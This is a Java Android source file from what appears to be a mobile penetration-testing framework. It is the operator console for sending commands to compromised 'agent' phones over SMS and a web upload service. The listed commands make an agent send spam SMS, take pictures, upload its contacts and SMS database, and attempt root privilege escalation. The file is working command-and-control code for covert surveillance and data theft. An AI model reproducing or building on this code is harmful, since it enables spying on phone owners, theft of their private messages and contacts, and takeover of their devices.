package com.bulbsecurity.framework.app;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Toast;
import com.bulbsecurity.framework.app2.R;

public class SendCommandActivity extends Activity implements AdapterView.OnItemSelectedListener, OnClickListener{
	 private Spinner spinner1;
	 private EditText message,number;
	  private Button btnSubmit;
	  private int agent;
	  private String agentkey, agentnumber, key;
	  
	  @Override
	public void onCreate(Bundle icicle) {
		super.onCreate(icicle);
		Bundle extras = getIntent().getExtras();
		agent = extras.getInt("agent");
		agentkey = extras.getString("key");
		agentnumber = extras.getString("number");
		setContentView(R.layout.commands);
		btnSubmit = (Button) findViewById(R.id.btnSubmit);
		btnSubmit.setEnabled(false);
		btnSubmit.setClickable(false);
		btnSubmit.setOnClickListener(this); 
		spinner1 = (Spinner) findViewById(R.id.spinner1);
		spinner1.setOnItemSelectedListener(this);
		message = (EditText) findViewById(R.id.message);
		message.setVisibility(View.INVISIBLE);
		number = (EditText) findViewById(R.id.number);
		number.setVisibility(View.INVISIBLE);
		key = ((FrameworkAndroidApp)this.getApplication()).getkey();
	  }
	@Override
	public void onClick(View v) {
		String sel = spinner1.getSelectedItem().toString();
		
		if (sel.equals("Send SMS"))
				{
					String num = number.getText().toString();
					String mess = message.getText().toString();
					String fullmess1 = agentkey.concat(" SPAM ");
					String fullmess2 = fullmess1.concat(num);
					String fullmess3 = fullmess2.concat(" ");
					String fullmess4 = fullmess3.concat(mess);
					Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
					intent2.putExtra("number",agentnumber);
					intent2.putExtra("message",fullmess4);
					startService(intent2);
				}
		else if (sel.equals("Take Picture"))
		{
			String fullmess1 = agentkey.concat(" PICT");
			Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
			intent2.putExtra("number",agentnumber);
			intent2.putExtra("message",fullmess1);
			startService(intent2);
			String sendstring1 = key.concat(" PICT ");
			String agentstring = String.valueOf(agent);
			String sendstring2 = sendstring1.concat(agentstring);
			 Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
		      intent.putExtra("uploadstring", sendstring2);
		      startService(intent);
		}
		else if (sel.equals("Get Contacts"))
		{
			String fullmess1 = agentkey.concat(" CONT SMS");
			Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
			intent2.putExtra("number",agentnumber);
			intent2.putExtra("message",fullmess1);
			startService(intent2);
			String sendstring1 = key.concat(" CONT ");
			String agentstring = String.valueOf(agent);
			String sendstring2 = sendstring1.concat(agentstring);
			 Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
		      intent.putExtra("uploadstring", sendstring2);
		      startService(intent);
		}
		else if (sel.equals("Get SMS Database"))
		{
			String fullmess1 = agentkey.concat(" SMSS SMS");
			Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
			intent2.putExtra("number",agentnumber);
			intent2.putExtra("message",fullmess1);
			startService(intent2);
			String sendstring1 = key.concat(" SMSS ");
			String agentstring = String.valueOf(agent);
			String sendstring2 = sendstring1.concat(agentstring);
			 Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
		      intent.putExtra("uploadstring", sendstring2);
		      startService(intent);

		}
		else if (sel.equals("Privilege Escalation"))
		{
			String fullmess1 = agentkey.concat(" ROOT");
			Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
			intent2.putExtra("number",agentnumber);
			intent2.putExtra("message",fullmess1);
			startService(intent2);
			String sendstring1 = key.concat(" ROOT ");
			String agentstring = String.valueOf(agent);
			String sendstring2 = sendstring1.concat(agentstring);
			 Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
		      intent.putExtra("uploadstring", sendstring2);
		      startService(intent);
		}
		
	}

	  public void onItemSelected(AdapterView<?> parent, 
		         View view, int pos, long id) 
		       {
		  String sel = parent.getItemAtPosition(pos).toString();
		  if (sel.equals("Send SMS"))
		  {
			  message.setVisibility(View.VISIBLE);
				number.setVisibility(View.VISIBLE); 
				btnSubmit.setEnabled(true);
				btnSubmit.setClickable(true);
			  
		  }
		  else if (sel.equals("Select a Command"))
		  {
			  message.setVisibility(View.INVISIBLE);
				number.setVisibility(View.INVISIBLE); 
				btnSubmit.setEnabled(false);
				btnSubmit.setClickable(false);			
		      	}
		  else 
		  {
			  message.setVisibility(View.INVISIBLE);
				number.setVisibility(View.INVISIBLE); 
				btnSubmit.setEnabled(true);
				btnSubmit.setClickable(true); 
		  }
		       }

	@Override
	public void onNothingSelected(AdapterView<?> arg0) {
		// TODO Auto-generated method stub
		
	}

}
